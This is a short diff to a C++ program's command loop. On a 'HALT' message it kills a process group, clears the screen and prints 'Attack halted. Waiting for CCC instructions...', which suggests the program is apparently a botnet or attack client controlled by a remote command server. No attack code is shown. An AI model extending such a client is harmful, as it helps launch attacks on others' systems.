@@ -51,7 +51,9 @@ int main()
 		if(strncmp("HALT", buffer, 4) == 0)
 		{
 			kill(-pid, SIGKILL);
-			cout << "killed process group " << pid;
+			cout << "\nkilled process group " << pid;
+			system("clear");
+			cout << "\nAttack halted. Waiting for CCC instructions...\n";
 			continue;
 		} 
 		
